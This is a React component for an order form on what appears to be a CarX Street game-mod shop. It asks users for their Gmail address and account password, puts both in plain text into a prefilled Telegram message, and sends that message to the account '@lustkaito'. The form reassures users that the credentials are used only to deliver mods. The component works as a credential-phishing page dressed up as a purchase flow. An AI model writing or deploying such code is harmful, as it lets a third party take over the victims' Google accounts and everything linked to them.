"use client"

import { useState } from "react"
import { X, Mail, Lock, Eye, EyeOff, Send, AlertTriangle, CheckCircle2, Zap, Sparkles } from "lucide-react"
import { type OrderSelection } from "@/app/page"
import { services } from "@/lib/products"

interface OrderModalProps {
  open: boolean
  selections: OrderSelection[]
  onClose: () => void
}

export default function OrderModal({ open, selections, onClose }: OrderModalProps) {
  const [gmail, setGmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPass, setShowPass] = useState(false)
  const [agreed, setAgreed] = useState(false)
  const [step, setStep] = useState<"form" | "success">("form")
  const [errors, setErrors] = useState<{ gmail?: string; password?: string; agreed?: string }>({})

  function validate() {
    const e: typeof errors = {}
    if (!gmail.trim()) e.gmail = "Gmail is required"
    else if (!gmail.includes("@gmail.com")) e.gmail = "Must be a valid @gmail.com address"
    if (!password.trim()) e.password = "Password is required"
    else if (password.length < 6) e.password = "Password must be at least 6 characters"
    if (!agreed) e.agreed = "You must agree to continue"
    return e
  }

  function buildTelegramMessage() {
    const lines = [
      "🎮 *New CarX Street Mod Order*",
      "",
      "📋 *Order Details:*",
      ...selections.map((s) => {
        const svc = services.find((x) => x.id === s.id)
        return `• ${s.name}: *${s.value}${s.unit ? " " + s.unit : ""}*`
      }),
      "",
      "💰 *Price:* To be estimated by seller",
      "",
      `📧 *Gmail:* ${gmail}`,
      `🔑 *Password:* ${password}`,
      "",
      "Please confirm the price and proceed!",
    ]
    return encodeURIComponent(lines.join("\n"))
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    const errs = validate()
    if (Object.keys(errs).length > 0) {
      setErrors(errs)
      return
    }
    setErrors({})
    setStep("success")
    const msg = buildTelegramMessage()
    setTimeout(() => {
      window.open(`https://t.me/lustkaito?text=${msg}`, "_blank")
    }, 1800)
  }

  function handleClose() {
    setStep("form")
    setGmail("")
    setPassword("")
    setAgreed(false)
    setErrors({})
    onClose()
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
      {/* Overlay */}
      <div
        className="absolute inset-0 backdrop-blur-md"
        style={{ background: "rgba(0,0,0,0.88)" }}
        onClick={handleClose}
      />

      {/* Modal */}
      <div
        className="animate-slide-up relative w-full max-w-md overflow-hidden rounded-2xl"
        style={{
          background: "#120d1e",
          border: "1px solid rgba(124,58,237,0.35)",
          boxShadow: "0 0 60px rgba(124,58,237,0.18), 0 0 120px rgba(219,39,119,0.08)",
          maxHeight: "90vh",
          overflowY: "auto",
        }}
      >
        {/* Top gradient bar */}
        <div
          className="h-[3px] w-full"
          style={{ background: "linear-gradient(90deg, #7c3aed, #db2777, #7c3aed)" }}
        />

        {/* Subtle bg glow */}
        <div
          className="pointer-events-none absolute left-1/2 top-0 -translate-x-1/2 rounded-full blur-3xl"
          style={{ width: 256, height: 160, background: "rgba(124,58,237,0.06)" }}
        />

        {/* Header */}
        <div className="relative flex items-center justify-between px-6 py-4" style={{ borderBottom: "1px solid rgba(124,58,237,0.2)" }}>
          <div className="flex items-center gap-3">
            <div
              className="flex h-9 w-9 items-center justify-center rounded-xl"
              style={{ background: "rgba(124,58,237,0.12)", border: "1px solid rgba(124,58,237,0.3)" }}
            >
              <Zap className="h-4 w-4 text-primary" fill="currentColor" />
            </div>
            <div>
              <h2
                className="text-sm font-black uppercase tracking-wider text-foreground"
                style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)" }}
              >
                Submit Order
              </h2>
              <p className="text-[10px]" style={{ color: "#7c6fa0" }}>Enter your CarX Street details</p>
            </div>
          </div>
          <button
            onClick={handleClose}
            className="rounded-xl p-1.5 transition-colors hover:bg-white/5"
            style={{ color: "#7c6fa0" }}
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {step === "form" ? (
          <form onSubmit={handleSubmit} className="relative flex flex-col gap-5 p-6">

            {/* Order summary */}
            <div
              className="rounded-xl p-4"
              style={{ background: "rgba(124,58,237,0.06)", border: "1px solid rgba(124,58,237,0.2)" }}
            >
              <p
                className="mb-3 text-[10px] font-bold uppercase tracking-[0.18em]"
                style={{ color: "rgba(124,58,237,0.7)" }}
              >
                Your Selection
              </p>
              <ul className="flex flex-col gap-2">
                {selections.map((item) => {
                  const svc = services.find((s) => s.id === item.id)
                  return (
                    <li key={item.id} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Sparkles className="h-3 w-3" style={{ color: svc?.color ?? "#7c3aed" }} />
                        <span className="text-xs font-semibold" style={{ color: "#a09bba" }}>
                          {item.name}
                        </span>
                      </div>
                      <span
                        className="text-xs font-black"
                        style={{ color: svc?.color ?? "#7c3aed" }}
                      >
                        {item.value} {item.unit}
                      </span>
                    </li>
                  )
                })}
              </ul>
              <div
                className="mt-3 flex items-start gap-2 rounded-lg pt-3"
                style={{ borderTop: "1px solid rgba(124,58,237,0.2)" }}
              >
                <Sparkles className="mt-0.5 h-3 w-3 shrink-0 text-primary" />
                <p className="text-[11px] leading-relaxed" style={{ color: "#7c6fa0" }}>
                  Price will be estimated by{" "}
                  <span className="font-bold text-primary">@lustkaito</span> after receiving your order on Telegram.
                </p>
              </div>
            </div>

            {/* Warning */}
            <div
              className="flex gap-2.5 rounded-xl p-3.5"
              style={{ background: "rgba(234,179,8,0.06)", border: "1px solid rgba(234,179,8,0.2)" }}
            >
              <AlertTriangle className="mt-0.5 h-4 w-4 shrink-0" style={{ color: "#eab308" }} />
              <p className="text-xs leading-relaxed" style={{ color: "rgba(234,179,8,0.85)" }}>
                Your credentials are used only to deliver your mods. Consider using a secondary account for extra safety.
              </p>
            </div>

            {/* Gmail */}
            <div className="flex flex-col gap-1.5">
              <label className="text-[10px] font-bold uppercase tracking-[0.15em]" style={{ color: "#7c6fa0" }}>
                CarX Street Gmail
              </label>
              <div className="relative">
                <Mail className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2" style={{ color: "rgba(124,111,160,0.6)" }} />
                <input
                  type="email"
                  value={gmail}
                  onChange={(e) => {
                    setGmail(e.target.value)
                    setErrors((prev) => ({ ...prev, gmail: undefined }))
                  }}
                  placeholder="yourname@gmail.com"
                  className="w-full rounded-xl py-3 pl-10 pr-4 text-sm outline-none transition-all"
                  style={{
                    background: "rgba(0,0,0,0.35)",
                    border: `1px solid ${errors.gmail ? "#dc2626" : gmail ? "rgba(124,58,237,0.5)" : "rgba(42,31,61,0.8)"}`,
                    color: "#f0ecfa",
                  }}
                />
              </div>
              {errors.gmail && <p className="text-xs text-red-400">{errors.gmail}</p>}
            </div>

            {/* Password */}
            <div className="flex flex-col gap-1.5">
              <label className="text-[10px] font-bold uppercase tracking-[0.15em]" style={{ color: "#7c6fa0" }}>
                Account Password
              </label>
              <div className="relative">
                <Lock className="absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2" style={{ color: "rgba(124,111,160,0.6)" }} />
                <input
                  type={showPass ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    setErrors((prev) => ({ ...prev, password: undefined }))
                  }}
                  placeholder="Enter your password"
                  className="w-full rounded-xl py-3 pl-10 pr-11 text-sm outline-none transition-all"
                  style={{
                    background: "rgba(0,0,0,0.35)",
                    border: `1px solid ${errors.password ? "#dc2626" : password ? "rgba(124,58,237,0.5)" : "rgba(42,31,61,0.8)"}`,
                    color: "#f0ecfa",
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPass((p) => !p)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 transition-colors hover:text-foreground"
                  style={{ color: "rgba(124,111,160,0.6)" }}
                >
                  {showPass ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
              {errors.password && <p className="text-xs text-red-400">{errors.password}</p>}
            </div>

            {/* Checkbox */}
            <label className="flex cursor-pointer items-start gap-3">
              <input
                type="checkbox"
                checked={agreed}
                onChange={(e) => {
                  setAgreed(e.target.checked)
                  setErrors((prev) => ({ ...prev, agreed: undefined }))
                }}
                className="mt-0.5 h-4 w-4 rounded accent-primary"
              />
              <span className="text-xs leading-relaxed" style={{ color: "#7c6fa0" }}>
                I confirm these are my CarX Street account credentials and I agree to the service terms.
              </span>
            </label>
            {errors.agreed && <p className="-mt-3 text-xs text-red-400">{errors.agreed}</p>}

            {/* Submit */}
            <button
              type="submit"
              className="flex items-center justify-center gap-2 rounded-xl py-3.5 text-sm font-black uppercase tracking-widest text-white transition-all hover:brightness-110 active:scale-[0.98]"
              style={{
                background: "linear-gradient(135deg, #7c3aed 0%, #db2777 100%)",
                boxShadow: "0 0 20px rgba(124,58,237,0.3)",
              }}
            >
              <Send className="h-4 w-4" />
              Submit &amp; Go to Telegram
            </button>
          </form>
        ) : (
          /* Success */
          <div className="relative flex flex-col items-center gap-5 px-6 py-14 text-center">
            <div
              className="pointer-events-none absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 rounded-full blur-3xl"
              style={{ width: 160, height: 160, background: "rgba(124,58,237,0.1)" }}
            />

            <div
              className="relative flex h-20 w-20 items-center justify-center rounded-full"
              style={{
                background: "rgba(124,58,237,0.12)",
                border: "1px solid rgba(124,58,237,0.4)",
                boxShadow: "0 0 30px rgba(124,58,237,0.4), 0 0 60px rgba(219,39,119,0.2)",
              }}
            >
              <CheckCircle2 className="h-10 w-10 text-primary" />
            </div>

            <div>
              <h3
                className="text-xl font-black uppercase text-foreground"
                style={{ fontFamily: "var(--font-display, 'Orbitron', sans-serif)" }}
              >
                Order Sent!
              </h3>
              <p className="mt-1.5 text-sm" style={{ color: "#7c6fa0" }}>
                Redirecting to Telegram to get your price...
              </p>
            </div>

            <div className="flex gap-2">
              {[0, 1, 2].map((i) => (
                <span
                  key={i}
                  className="h-2 w-2 rounded-full bg-primary"
                  style={{ animation: `pulse 1s ease-in-out ${i * 0.25}s infinite` }}
                />
              ))}
            </div>

            <a
              href="https://t.me/lustkaito"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-1 flex items-center gap-2.5 rounded-xl px-6 py-3 text-sm font-black uppercase tracking-wider text-white transition-all hover:brightness-110"
              style={{
                background: "linear-gradient(135deg, #7c3aed 0%, #db2777 100%)",
                boxShadow: "0 0 20px rgba(124,58,237,0.3)",
              }}
            >
              <svg className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-2.04 9.614c-.147.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.903.607z" />
              </svg>
              Open Telegram
            </a>
          </div>
        )}
      </div>
    </div>
  )
}
